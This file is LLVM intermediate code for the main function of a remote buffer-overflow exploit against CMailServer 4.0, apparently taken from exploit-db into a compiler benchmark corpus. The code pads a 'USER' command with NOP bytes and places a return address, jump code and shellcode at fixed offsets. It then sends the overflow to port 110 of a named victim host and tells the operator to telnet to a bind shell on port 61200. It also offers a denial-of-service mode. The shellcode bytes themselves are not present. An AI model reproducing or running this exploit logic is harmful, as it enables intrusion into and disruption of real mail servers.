; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21467.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21467.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i8*, i32 }
%struct.sockaddr_in = type { i32, i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i8 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [73 x i8] c"\0ARemote exploit for CMailServer 4.0.2003.03.30 by m00 security / Over G\0A\00", align 1
@.str.1 = private unnamed_addr constant [43 x i8] c"\09         www.m00.ru \09  overg[at]mail.ru\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"Usage: %s <victim_host> <type>\0A\00", align 1
@.str.3 = private unnamed_addr constant [52 x i8] c"type:\0A -d DoS attack\0A -s Bind shell on port 61200\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"USER \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"-s\00", align 1
@ret_addr = common dso_local global i8* null, align 8
@jmpcode = common dso_local global i8* null, align 8
@shlcod = common dso_local global i8* null, align 8
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@INVALID_SOCKET = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [16 x i8] c"Socket error!\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [27 x i8] c"[+] Resolving hostname... \00", align 1
@.str.8 = private unnamed_addr constant [12 x i8] c"FAILED :( \0A\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c" OK \0A\00", align 1
@.str.10 = private unnamed_addr constant [19 x i8] c"[+] Connecting... \00", align 1
@.str.11 = private unnamed_addr constant [13 x i8] c" FAILED :( \0A\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c" OK\0A\00", align 1
@.str.13 = private unnamed_addr constant [30 x i8] c"[+] Sending exploit buffer...\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [48 x i8] c" OK. \0A\0A[+] Use telnet for connect to %s:61200\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca [2101 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.1, i64 0, i64 0))
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 3
  br i1 %18, label %19, label %25

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i8* %22)
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %138

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  store i8* %28, i8** %12, align 8
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  store i8* %31, i8** %13, align 8
  store i32 0, i32* %11, align 4
  br label %32

32:                                               ; preds = %39, %25
  %33 = load i32, i32* %11, align 4
  %34 = icmp slt i32 %33, 2100
  br i1 %34, label %35, label %42

35:                                               ; preds = %32
  %36 = load i32, i32* %11, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [2101 x i8], [2101 x i8]* %14, i64 0, i64 %37
  store i8 -112, i8* %38, align 1
  br label %39

39:                                               ; preds = %35
  %40 = load i32, i32* %11, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %11, align 4
  br label %32

42:                                               ; preds = %32
  %43 = getelementptr inbounds [2101 x i8], [2101 x i8]* %14, i64 0, i64 0
  %44 = call i32 @memcpy(i8* %43, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0), i32 5)
  %45 = load i8*, i8** %13, align 8
  %46 = call i64 @strstr(i8* %45, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %47 = icmp ne i64 %46, 0
  br i1 %47, label %48, label %69

48:                                               ; preds = %42
  %49 = getelementptr inbounds [2101 x i8], [2101 x i8]* %14, i64 0, i64 515
  %50 = load i8*, i8** @ret_addr, align 8
  %51 = load i8*, i8** @ret_addr, align 8
  %52 = call i32 @strlen(i8* %51)
  %53 = call i32 @memcpy(i8* %49, i8* %50, i32 %52)
  %54 = getelementptr inbounds [2101 x i8], [2101 x i8]* %14, i64 0, i64 519
  %55 = load i8*, i8** @jmpcode, align 8
  %56 = load i8*, i8** @jmpcode, align 8
  %57 = call i32 @strlen(i8* %56)
  %58 = call i32 @memcpy(i8* %54, i8* %55, i32 %57)
  %59 = load i8*, i8** @jmpcode, align 8
  %60 = call i32 @strlen(i8* %59)
  %61 = add nsw i32 519, %60
  %62 = add nsw i32 %61, 870
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [2101 x i8], [2101 x i8]* %14, i64 0, i64 %63
  %65 = load i8*, i8** @shlcod, align 8
  %66 = load i8*, i8** @shlcod, align 8
  %67 = call i32 @strlen(i8* %66)
  %68 = call i32 @memcpy(i8* %64, i8* %65, i32 %67)
  br label %69

69:                                               ; preds = %48, %42
  %70 = call i32 @MAKEWORD(i32 1, i32 1)
  store i32 %70, i32* %7, align 4
  %71 = load i32, i32* %7, align 4
  %72 = call i64 @WSAStartup(i32 %71, i32* %6)
  %73 = icmp slt i64 %72, 0
  br i1 %73, label %74, label %75

74:                                               ; preds = %69
  store i32 -1, i32* %3, align 4
  br label %138

75:                                               ; preds = %69
  %76 = load i32, i32* @AF_INET, align 4
  %77 = load i32, i32* @SOCK_STREAM, align 4
  %78 = call i64 @socket(i32 %76, i32 %77, i32 0)
  store i64 %78, i64* %10, align 8
  %79 = load i64, i64* %10, align 8
  %80 = load i64, i64* @INVALID_SOCKET, align 8
  %81 = icmp eq i64 %79, %80
  br i1 %81, label %82, label %85

82:                                               ; preds = %75
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0))
  %84 = call i32 @exit(i32 1) #3
  unreachable

85:                                               ; preds = %75
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.7, i64 0, i64 0))
  %87 = load i8*, i8** %12, align 8
  %88 = call %struct.hostent* @gethostbyname(i8* %87)
  store %struct.hostent* %88, %struct.hostent** %8, align 8
  %89 = icmp eq %struct.hostent* %88, null
  br i1 %89, label %90, label %93

90:                                               ; preds = %85
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0))
  %92 = call i32 @exit(i32 1) #3
  unreachable

93:                                               ; preds = %85
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0))
  %95 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %96 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %95, i32 0, i32 0
  %97 = load %struct.hostent*, %struct.hostent** %8, align 8
  %98 = getelementptr inbounds %struct.hostent, %struct.hostent* %97, i32 0, i32 0
  %99 = load i8*, i8** %98, align 8
  %100 = load %struct.hostent*, %struct.hostent** %8, align 8
  %101 = getelementptr inbounds %struct.hostent, %struct.hostent* %100, i32 0, i32 1
  %102 = load i32, i32* %101, align 8
  %103 = call i32 @memcpy(i8* %96, i8* %99, i32 %102)
  %104 = load i32, i32* @AF_INET, align 4
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i32 %104, i32* %105, align 4
  %106 = call i32 @htons(i32 110)
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i32 %106, i32* %107, align 4
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.10, i64 0, i64 0))
  %109 = load i64, i64* %10, align 8
  %110 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %111 = call i64 @connect(i64 %109, %struct.sockaddr* %110, i32 12)
  %112 = icmp ne i64 %111, 0
  br i1 %112, label %113, label %116

113:                                              ; preds = %93
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0))
  %115 = call i32 @exit(i32 1) #3
  unreachable

116:                                              ; preds = %93
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0))
  %118 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.13, i64 0, i64 0))
  %119 = load i64, i64* %10, align 8
  %120 = getelementptr inbounds [2101 x i8], [2101 x i8]* %14, i64 0, i64 0
  %121 = call i32 @send(i64 %119, i8* %120, i32 2100, i32 0)
  %122 = load i64, i64* %10, align 8
  %123 = call i32 @send(i64 %122, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i32 2, i32 0)
  %124 = icmp eq i32 %123, -1
  br i1 %124, label %125, label %130

125:                                              ; preds = %116
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0))
  %127 = load i64, i64* %10, align 8
  %128 = call i32 @closesocket(i64 %127)
  %129 = call i32 @exit(i32 1) #3
  unreachable

130:                                              ; preds = %116
  %131 = call i32 @Sleep(i32 100)
  %132 = load i8**, i8*** %5, align 8
  %133 = getelementptr inbounds i8*, i8** %132, i64 1
  %134 = load i8*, i8** %133, align 8
  %135 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.15, i64 0, i64 0), i8* %134)
  %136 = load i64, i64* %10, align 8
  %137 = call i32 @closesocket(i64 %136)
  store i32 0, i32* %3, align 4
  br label %138

138:                                              ; preds = %130, %74, %19
  %139 = load i32, i32* %3, align 4
  ret i32 %139
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i64 @socket(i32, i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i64 @connect(i64, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i64, i8*, i32, i32) #1

declare dso_local i32 @closesocket(i64) #1

declare dso_local i32 @Sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
